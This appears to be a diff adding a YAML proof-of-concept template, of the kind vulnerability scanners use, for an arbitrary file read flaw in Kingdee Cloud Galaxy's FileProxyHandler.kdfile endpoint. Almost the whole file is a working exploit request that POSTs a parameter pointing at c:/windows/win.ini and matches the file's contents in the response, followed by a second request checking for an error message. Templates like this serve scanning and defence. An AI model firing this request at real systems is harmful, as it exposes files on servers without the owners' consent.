@@ -1,0 +1,22 @@
+id: poc-yaml-Kingdee-k3Cloud-FileProxyHandler-kdfile-file-read
+info:
+  name: 金蝶云星空 FileProxyHandler.kdfile 任意文件读取漏洞
+  severity: critical
+  tags:
+  - 文件读取
+  finger: 金蝶云星空
+requests:
+- method: POST
+  path: /k3Cloud/FileProxyHandler.kdfile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Ope=SDL&F=c:/windows/win.ini&Area=0&Step=100000
+  expression: status_code == 200 && contains(body, "[fonts]") && contains(body, "[files]")
+- method: GET
+  path: /k3Cloud/FileProxyHandler.kdfile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: status_code == 200 && contains(body, "\"actionname\":\"ShowErrMsg\"")
+    && contains(body,"未将对象引用设置到对象的实例")
+variables: {}
+transport: http
